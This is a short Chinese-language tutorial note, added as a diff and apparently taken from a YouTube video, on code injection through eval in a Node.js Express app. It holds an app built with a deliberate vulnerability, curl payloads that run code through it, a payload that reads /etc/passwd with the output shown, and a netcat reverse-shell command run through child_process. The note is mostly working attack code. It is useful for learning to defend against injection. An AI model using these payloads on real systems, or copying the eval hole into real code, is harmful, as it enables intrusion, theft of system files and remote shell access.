@@ -1,0 +1,38 @@
+https://www.youtube.com/watch?v=B8gH_xgLbSU
+16:00往后
+
+var express = require('express')
+var app = express()
+
+app.get('/',function(req,res){
+	res.send('hello'+eval(req.query.q));
+//实际应用请尽可能少用或不用eval
+	console.log(req.query.q);
+})
+
+app.listen(8080,function(){console.log("listening on 8080")})
+
+以最常用且被广泛认为无害的组件util举例
+
+要执行代码
+require('util').format('%s','hacked')
+
+借用eval生成url编码（也可以自己生成）
+curl http://localhost:8080?q=$(php -r "echo urlencode(\"require('util').format('%s','hacked')\");")
+
+curl http://localhost:8080?q=require(%27util%27).format(%27%25s%27%2C%20%27hacked%27)
+
+输出：hello hacked
+
+
+获取密码示例
+require('fs').readFileSync('/etc/passwd')
+hello root:x:0:0:root:/root:/bin/bash
+……
+
+
+
+攻击示例
+利用node子进程模块新建进程执行命令，比如说反弹shell
+require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc localhost 4444 >/tmp/f')
+
